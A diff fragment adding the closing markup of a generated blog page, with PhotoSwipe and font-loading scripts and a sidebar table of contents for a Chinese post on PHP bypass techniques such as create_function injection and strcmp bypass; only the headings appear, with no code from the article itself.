+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#php特性绕过技巧">PHP特性绕过技巧</a>
+      <ul>
+        <li><a href="#create-function-绕过">create_function 绕过</a>
+          <ul>
+            <li><a href="#基本使用">基本使用</a></li>
+            <li><a href="#注入实例">注入实例</a></li>
+          </ul>
+        </li>
+        <li><a href="#is-numberic-绕过">is_numberic() 绕过</a></li>
+        <li><a href="#strcmp-绕过">strcmp 绕过</a></li>
+        <li><a href="#弱类型">弱类型</a>
+          <ul>
+            <li><a href="#强类型-弱类型">强类型，弱类型</a></li>
+            <li><a href="#php中的比较是否相等">PHP中的比较是否相等</a></li>
+            <li><a href="#实例">实例</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
